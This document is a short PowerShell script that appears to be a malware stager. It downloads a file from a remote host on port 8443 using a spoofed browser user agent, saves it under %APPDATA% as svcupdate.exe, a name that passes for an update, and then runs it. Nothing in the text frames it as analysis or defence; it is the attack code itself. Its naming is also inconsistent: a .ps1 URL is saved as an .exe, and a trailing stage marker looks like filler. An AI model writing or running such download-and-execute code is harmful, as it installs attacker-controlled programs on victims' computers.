$Stage1Url = 'https://adatum.com:8443/stage1.ps1'
$WorkingPath = "$env:APPDATA\svcupdate.exe"
$RequestTimeout = 72
$RequestAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
$ErrorActionPreference = "Stop"

function Get-Stage2Payload {
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45,
        [string]$UserAgent = "Mozilla/5.0"
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$ResultObject = Get-Stage2Payload -SourceUrl $Stage1Url -DestinationPath $WorkingPath -TimeoutSec $RequestTimeout -UserAgent $RequestAgent
if ($ResultObject) {
    Start-Process -FilePath $WorkingPath
}

$StageMarker = "stage-25"
Write-Verbose "stage marker 19 reached"
